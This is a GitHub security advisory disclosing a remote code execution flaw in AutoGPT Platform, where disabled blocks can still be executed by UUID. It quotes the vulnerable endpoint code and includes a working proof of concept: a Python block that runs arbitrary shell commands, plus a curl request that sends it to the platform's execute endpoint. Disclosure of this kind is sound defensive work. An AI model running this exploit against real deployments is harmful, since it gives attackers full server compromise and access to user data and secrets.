# [H] AutoGPT is Vulnerable to RCE via Disabled Block Execution

## Summary
Severity: High
Advisory: GHSA-r277-3xc5-c79v
CVE: CVE-2026-24780
CWE: CWE-276, CWE-863, CWE-94
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P (CVSS_V4)
Published: 2026-01-29
Source: https://github.com/advisories/GHSA-r277-3xc5-c79v
Type: github-advisory

## Affected
- PyPI: `agpt` — affected >=0

## Details
### Summary

AutoGPT Platform's block execution endpoints (both main web API and external API) allow executing blocks by UUID without checking the `disabled` flag. Any authenticated user can execute the disabled `BlockInstallationBlock`, which writes arbitrary Python code to the server filesystem and executes it via `__import__()`, achieving Remote Code Execution. In default self-hosted deployments where Supabase signup is enabled, an attacker can self-register; if signup is disabled (e.g., hosted), the attacker needs an existing account.

### Details

**Two vulnerable endpoints exist:**

1. **Main Web API** ([`v1.py#L355-395`](https://github.com/Significant-Gravitas/AutoGPT/blob/master/autogpt_platform/backend/backend/api/features/v1.py#L355-L395)) - Any authenticated user:

```python
@v1_router.post(
    path="/blocks/{block_id}/execute",
    dependencies=[Security(requires_user)],  # Just requires login
)
async def execute_graph_block(block_id: str, data: BlockInput, ...):
    obj = get_block(block_id)
    if not obj:
        raise HTTPException(status_code=404, ...)

    # NO CHECK FOR obj.disabled!

    async for name, data in obj.execute(data, ...):
        output[name].append(data)
```

2. **External API** ([`external/v1/routes.py#L79-93`](https://github.com/Significant-Gravitas/AutoGPT/blob/master/autogpt_platform/backend/backend/api/external/v1/routes.py#L79-L93)) - Same issue.

The external API is gated by API key permissions, but any authenticated user can mint API keys with arbitrary permissions via the main API (including `EXECUTE_BLOCK`) at [`v1.py#L1408-1424`](https://github.com/Significant-Gravitas/AutoGPT/blob/master/autogpt_platform/backend/backend/api/features/v1.py#L1408-L1424). As a result, a low-privilege user can create an API key and invoke the external block execution route.

**The disabled flag is documented but not enforced:**

From [`block.py#L459`](https://github.com/Significant-Gravitas/AutoGPT/blob/master/autogpt_platform/backend/backend/data/block.py#L459):
> "disabled: If the block is disabled, it will not be available for execution."

The block listing endpoint correctly filters disabled blocks (`if not b.disabled`), but the execution endpoints do not check this flag.

**The dangerous block ([`blocks/block.py#L15-78`](https://github.com/Significant-Gravitas/AutoGPT/blob/master/autogpt_platform/backend/backend/blocks/block.py#L15-L78)):**

```python
class BlockInstallationBlock(Block):
    """
    NOTE: This block allows remote code execution on the server,
    and it should be used for development purposes only.
    """

    def __init__(self):
        super().__init__(
            id="45e78db5-03e9-447f-9395-308d712f5f08",  # Hardcoded, public UUID
            disabled=True,  # NOT ENFORCED!
        )

    async def run(self, input_data: Input, **kwargs) -> BlockOutput:
        code = input_data.code

        # Writes attacker code to server filesystem
        file_path = f"{block_dir}/{file_name}.py"
        with open(file_path, "w") as f:
            f.write(code)

        # Executes via import (RCE)
        module = __import__(module_name, fromlist=[class_name])
```

### PoC

**1. Create malicious block code**

```python
PAYLOAD = '''
import os
from backend.data.block import Block, BlockOutput, BlockSchemaInput, BlockSchemaOutput
from backend.data.model import SchemaField

class RCEBlock(Block):
    class Input(BlockSchemaInput):
        cmd: str = SchemaField(description="Command")
    class Output(BlockSchemaOutput):
        result: str = SchemaField(description="Result")

    def __init__(self):
        super().__init__(
            id="aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
            description="RCE",
            input_schema=self.Input,
            output_schema=self.Output,
        )

    async def run(self, input_data, **kwargs):
        import subprocess
        result = subprocess.check_output(input_data.cmd, shell=True).decode()
        yield "result", result
'''
```

**2. Execute via main web API (any logged-in user)**

```bash
# Get session cookie by logging into the web UI, then:
curl -X POST "https://platform.autogpt.app/api/blocks/45e78db5-03e9-447f-9395-308d712f5f08/execute" \
  -H "Cookie: session=<your_session_cookie>" \
  -H "Content-Type: application/json" \
  -d '{"code": "<PAYLOAD>"}'
```

The malicious Python code is written to the server's `backend/blocks/` directory and immediately executed via `__import__()`.

**Alternative route:** Mint an API key with `EXECUTE_BLOCK` via `POST /api-keys`, then call the external API `POST /external-api/v1/blocks/{id}/execute`.

### Impact

**Any user who can create an account on AutoGPT Platform can achieve full Remote Code Execution on the backend server.**

This allows:
- Complete server compromise
- Access to all user data, credentials, and API keys stored in the database
- Access to environment variables (cloud credentials, secrets)
- Lateral movement to connected infrastructure (Redis, PostgreSQL, cloud services)
- Persistent backdoor installation

**Attack requirements:**
- Create a free account on the platform (default self-hosted enables signup; hosted deployments may disable signup, requiring an existing account)
- Know the disabled block's UUID (hardcoded in public source code: `45e78db5-03e9-447f-9395-308d712f5f08`)

**Why the `disabled` flag exists but fails:**
- Block listing correctly filters disabled blocks (users don't see them in UI)
- Execution endpoints bypass this check entirely
- The UUID is static and publicly known from the open-source codebase

**Severity note:** CVSS assumes the default self-hosted configuration where signup is enabled (low-privilege authentication is easy to obtain). If signup is disabled in a hosted deployment, likelihood is lower, but impact remains critical once any authenticated account exists.

A fix is available, but was not published to the PyPI registry at time of publication: [0.6.44](https://github.com/Significant-Gravitas/AutoGPT/releases/tag/v0.6.44)

## References
- https://github.com/Significant-Gravitas/AutoGPT/security/advisories/GHSA-r277-3xc5-c79v
- https://nvd.nist.gov/vuln/detail/CVE-2026-24780
- https://github.com/Significant-Gravitas/AutoGPT
- https://github.com/Significant-Gravitas/AutoGPT/blob/master/autogpt_platform/backend/backend/api/external/v1/routes.py#L79-L93
- https://github.com/Significant-Gravitas/AutoGPT/blob/master/autogpt_platform/backend/backend/api/features/v1.py#L1408-L1424
- https://github.com/Significant-Gravitas/AutoGPT/blob/master/autogpt_platform/backend/backend/api/features/v1.py#L355-L395
- https://github.com/Significant-Gravitas/AutoGPT/blob/master/autogpt_platform/backend/backend/blocks/block.py#L15-L78
- https://github.com/Significant-Gravitas/AutoGPT/blob/master/autogpt_platform/backend/backend/data/block.py#L459
